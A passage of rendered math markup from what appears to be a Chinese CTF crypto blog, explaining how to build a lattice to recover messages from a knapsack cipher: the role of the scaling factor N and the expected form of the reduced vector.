class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:6.66em;vertical-align:-3.079999999999999em;"></span><span class="minner"><span class="mopen"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:3.555985em;"><span style="top:-0.7499750000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎣</span></span></span><span style="top:-1.8999750000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎢</span></span></span><span style="top:-2.4959750000000005em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎢</span></span></span><span style="top:-3.0919750000000006em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎢</span></span></span><span style="top:-3.6879750000000002em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎢</span></span></span><span style="top:-4.283975em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎢</span></span></span><span style="top:-4.314965000000001em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎢</span></span></span><span style="top:-5.555985000000001em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎡</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:3.050045em;"><span></span></span></span></span></span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:3.5800000000000005em;"><span style="top:-6.427500000000001em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord">2</span></span></span><span style="top:-5.2275em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-3.3675em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord"><span class="mord">⋮</span><span class="mord rule" style="border-right-width:0em;border-top-width:1.5em;bottom:0em;"></span></span></span></span><span style="top:-2.167500000000001em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-0.9675000000000009em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:3.079999999999999em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:3.5800000000000005em;"><span style="top:-6.427500000000001em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-5.2275em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord">2</span></span></span><span style="top:-3.3675em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord"><span class="mord">⋮</span><span class="mord rule" style="border-right-width:0em;border-top-width:1.5em;bottom:0em;"></span></span></span></span><span style="top:-2.167500000000001em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-0.9675000000000009em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:3.079999999999999em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:3.5800000000000005em;"><span style="top:-6.240000000000001em;"><span class="pstrut" style="height:3.5em;"></span><span class="mord"><span class="minner">⋯</span></span></span><span style="top:-5.04em;"><span class="pstrut" style="height:3.5em;"></span><span class="mord"><span class="minner">⋯</span></span></span><span style="top:-3.18em;"><span class="pstrut" style="height:3.5em;"></span><span class="mord"><span class="minner">⋱</span></span></span><span style="top:-1.9800000000000009em;"><span class="pstrut" style="height:3.5em;"></span><span class="mord"><span class="minner">⋯</span></span></span><span style="top:-0.7800000000000009em;"><span class="pstrut" style="height:3.5em;"></span><span class="mord"><span class="minner">⋯</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:3.079999999999999em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:3.5800000000000005em;"><span style="top:-6.427500000000001em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-5.2275em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-3.3675em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord"><span class="mord">⋮</span><span class="mord rule" style="border-right-width:0em;border-top-width:1.5em;bottom:0em;"></span></span></span></span><span style="top:-2.167500000000001em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord">2</span></span></span><span style="top:-0.9675000000000009em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:3.079999999999999em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:3.5800000000000005em;"><span style="top:-6.427500000000001em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-5.2275em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-3.3675em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord"><span class="mord">⋮</span><span class="mord rule" style="border-right-width:0em;border-top-width:1.5em;bottom:0em;"></span></span></span></span><span style="top:-2.167500000000001em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-0.9675000000000009em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mord mathnormal">c</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:3.079999999999999em;"><span></span></span></span></span></span></span></span><span class="mclose"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:3.555985em;"><span style="top:-0.7499750000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎦</span></span></span><span style="top:-1.8999750000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎥</span></span></span><span style="top:-2.4959750000000005em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎥</span></span></span><span style="top:-3.0919750000000006em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎥</span></span></span><span style="top:-3.6879750000000002em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎥</span></span></span><span style="top:-4.283975em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎥</span></span></span><span style="top:-4.314965000000001em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎥</span></span></span><span style="top:-5.555985000000001em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎤</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:3.050045em;"><span></span></span></span></span></span></span></span></span></span></span></span></p><ul><li><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>a</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">a_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>和<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>c</mi></mrow><annotation encoding="application/x-tex">c</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">c</span></span></span></span>前面的N是：<strong>缩放因子</strong>，放大最后一列，控制格结构。一般我们造格，N取1就行。如果N取1规约不出来的话我们就可以调整N，此时其选取范围应为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>N</mi><mo>&gt;</mo><mfrac><mn>1</mn><mn>2</mn></mfrac><msqrt><mi>n</mi></msqrt></mrow><annotation encoding="application/x-tex">N&gt;\frac{1}{2}\sqrt{n}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.72243em;vertical-align:-0.0391em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.190108em;vertical-align:-0.345em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.845108em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mord sqrt"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8002800000000001em;"><span class="svg-align" style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord" style="padding-left:0.833em;"><span class="mord mathnormal">n</span></span></span><span style="top:-2.76028em;"><span class="pstrut" style="height:3em;"></span><span class="hide-tail" style="min-width:0.853em;height:1.08em;"><svg width="400em" height="1.08em" viewbox="0 0 400000 1080" preserveaspectratio="xMinYMin slice"><path d="M95,702c-2.7,0,-7.17,-2.7,-13.5,-8c-5.8,-5.3,-9.5,-10,-9.5,-14c0,-2,0.3,-3.3,1,-4c1.3,-2.7,23.83,-20.7,67.5,-54c44.2,-33.3,65.8,-50.3,66.5,-51c1.3,-1.3,3,-2,5,-2c4.7,0,8.7,3.3,12,10s173,378,173,378c0.7,0,35.3,-71,104,-213c68.7,-142,137.5,-285,206.5,-429c69,-144,104.5,-217.7,106.5,-221l0 -0c5.3,-9.3,12,-14,20,-14H400000v40H845.2724s-225.272,467,-225.272,467s-235,486,-235,486c-2.7,4.7,-9,7,-19,7c-6,0,-10,-1,-12,-3s-194,-422,-194,-422s-65,47,-65,47zM834 80h400000v40h-400000z"/></svg></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.23972em;"><span></span></span></span></span></span></span></span></span></p></li><li><p>如果我们造的格是左边矩阵（存在<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mfrac><mn>1</mn><mn>2</mn></mfrac></mrow><annotation encoding="application/x-tex">\frac{1}{2}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.190108em;vertical-align:-0.345em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.845108em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span>）我们规约出来的结果，如果满足这样的形式就说明是我们要找的消息二进制序列。<strong>具体值需要根据情况进行分析</strong>，该情况只是分析逐二进制序列加密，下图是论文给出的相应地方</p></li></ul><p class="katex-block"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msup><mi>v</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mo>=</mo><mo stretchy="false">(</mo><msubsup><mi>v</mi><mn>1</mn><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msubsup><mo separator="true">,</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mo separator="true">,</mo><msubsup><mi>v</mi><mn>2</mn><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msubsup><mo separator="true">,</mo><mn>0</mn><mo stretchy="false">)</mo><mo>∈</mo><mi>L</mi><mo stretchy="false">(</mo><mi>B</mi><mo stretchy="false">)</mo><mo separator="true">,</mo><msubsup><mi>v</mi><mi>i</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msubsup><mo>=</mo><msub><mi>v</mi><mi>i</mi></msub><mo>−</mo><mfrac><mn>1</mn><mn>2</mn></mfrac><mspace linebreak="newline"></mspace><mtext>即</mtext><msup><mi>v</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mo>=</mo><mo stretchy="false">(</mo><msubsup><mi>v</mi><mn>1</mn><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msubsup><mo separator="true">,</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mo separator="true">,</mo><msubsup><mi>v</mi><mn>2</mn><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msubsup><mo separator="true">,</mo><mn>0</mn><mo stretchy="false">)</mo><mo>∈</mo><mi>L</mi><mo stretchy="false">(</mo><mi>B</mi><mo stretchy="false">)</mo><mo separator="true">,</mo><msubsup><mi>v</mi><mi>i</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msubsup><mo>∈</mo><mo stretchy="false">{</mo><mfrac><mn>1</mn><mn>2</mn></mfrac><mo separator="true">,</mo><mo>−</mo><mfrac><mn>1</mn><mn>2</mn></mfrac><mo stretchy="false">}</mo></mrow><annotation encoding="application/x-tex">v&#x27; = (v&#x27;_1,...,v&#x27;_2,0)\in L(B),v&#x27;_i = v_i-\frac{1}{2}\\即v&#x27; = (v&#x27;_1,...,v&#x27;_2,0)\in L(B),v&#x27;_i\in \{\frac{1}{2},-\frac{1}{2}\}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.801892em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.801892em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.051892em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8018919999999999em;"><span style="top:-2.4530000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8018919999999999em;"><span style="top:-2.4530000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">0</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.051892em;vertical-align:-0.25em;"></span><span class="mord mathnormal">L</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="mclose">)</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8018919999999999em;"><span style="top:-2.4530000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.73333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:2.00744em;vertical-align:-0.686em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.32144em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">2</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.801892em;vertical-align:0em;"></span><span class="mord cjk_fallback">即</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.801892em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.051892em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8018919999999999em;"><span style="top:-2.4530000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8018919999999999em;"><span style="top:-2.4530000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">0</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.051892em;vertical-align:-0.25em;"></span><span class="mord mathnormal">L</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="mclose">)</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8018919999999999em;"><span style="top:-2.4530000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:2.00744em;vertical-align:-0.686em;"></span><span class="mopen">{</span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.32144em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">2</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">−</span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.32144em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">2</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mclose">}</span></span></span></span></span></p><p><img src="/2025/05/27/CTFblog/CRYPTO%E7%B3%BB%E5%88%97blog/%E8%83%8C%E5%8C%85%E5%8A%A0%E5%AF%86/image-20250528171520111.png" alt="image-20250528171520111"></p><ul><li>如果我们造的是格是右边的那种矩阵，规约出来的结果就如下</li></ul><p class="katex-block"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msup><mi>v</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mo>=</mo><mo stretchy="false">(</mo><msubsup><mi>v</mi><mn>1</mn><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msubsup><mo separator="true">,</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mo separator="true">,</mo><msubsup><mi>v</mi><mn>2</mn><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msubsup><mo separator="true">,</mo><mn>0</mn><mo stretchy="false">)</mo><mo>∈</mo><mi>L</mi><mo stretchy="false">(</mo><mi>B</mi><mo stretchy="false">)</mo><mo separator="true">,</mo><msubsup><mi>v</mi><mi>i</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msubsup><mo>=</mo><mn>2</mn><msub><mi>v</mi><mi>i</mi></msub><mo>−</mo><mn>1</mn><mspace linebreak="newline"></mspace><mspace linebreak="newline"></mspace><mtext>即</mtext><msup><mi>v</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mo>=</mo><mo stretchy="false">(</mo><msubsup><mi>v</mi><mn>1</mn><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msubsup><mo separator="true">,</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mo separator="true">,</mo><msubsup><mi>v</mi><mn>2</mn><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msubsup><mo separator="true">,</mo><mn>0</mn><mo 